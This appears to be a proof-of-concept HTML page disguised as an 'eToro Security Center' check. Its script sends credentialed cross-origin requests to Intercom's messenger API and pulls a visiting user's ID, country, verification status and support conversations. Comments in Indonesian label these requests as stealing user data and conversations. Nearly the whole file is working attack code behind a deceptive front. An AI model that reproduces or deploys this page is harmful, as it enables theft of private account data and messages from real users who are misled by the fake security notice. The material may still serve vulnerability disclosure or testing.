<!DOCTYPE html>
<html>
<head>
    <title>eToro - Security Check</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
        .card { background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); max-width: 500px; width: 100%; }
        .data { background: #eef; padding: 0.5rem; margin: 0.5rem 0; border-radius: 4px; font-family: monospace; }
        .warning { color: red; }
        .chat { background: #fff; border:1px solid #ddd; padding:1rem; margin-top:1rem; border-radius:8px; }
        .msg { background:#dcf8c6; padding:0.5rem; margin:0.5rem 0; border-radius:4px; }
        .admin { background:#e3f2fd; text-align:right; }
    </style>
</head>
<body>
    <div class="card">
        <h2>eToro Security Center</h2>
        <p>We are checking your account status...</p>
        <div id="userData">Loading...</div>
        <div id="chatData"></div>
    </div>

    <script>
        const APP_ID = 'x8o64ufr';
        const BASE = 'https://api-iam.intercom.io';

        // Curi data user dari /ping
        fetch(`${BASE}/messenger/web/ping`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `app_id=${APP_ID}&v=3&source=apiBoot`,
            credentials: 'include'
        })
        .then(res => res.json())
        .then(data => {
            const u = data.user;
            if (u) {
                document.getElementById('userData').innerHTML = `
                    <div class="data">User ID: ${u.id}</div>
                    <div class="data">Country: ${u.country_code || 'N/A'}</div>
                    <div class="data">Verified: ${u.identity_verified ? '✅ Yes' : '❌ No'}</div>
                `;
            }
        })
        .catch(e => {
            document.getElementById('userData').innerHTML = '⚠️ Failed to load account info.';
        });

        // Curi daftar percakapan
        fetch(`${BASE}/messenger/web/conversations?app_id=${APP_ID}`, {
            credentials: 'include'
        })
        .then(res => res.json())
        .then(data => {
            const convs = data.conversations;
            if (convs && convs.length > 0) {
                let html = '<h3>Recent Messages</h3><div class="chat">';
                convs.forEach(conv => {
                    const msg = conv.conversation_message;
                    html += `<div class="msg admin"><strong>eToro Support:</strong> ${msg.blocks[2]?.text || '(message)'}</div>`;
                });
                html += '</div>';
                document.getElementById('chatData').innerHTML = html;
            } else {
                document.getElementById('chatData').innerHTML = '<p>No messages found.</p>';
            }
        })
        .catch(e => {
            document.getElementById('chatData').innerHTML = '<p class="warning">⚠️ Chat data not accessible</p>';
        });
    </script>
</body>
</html>
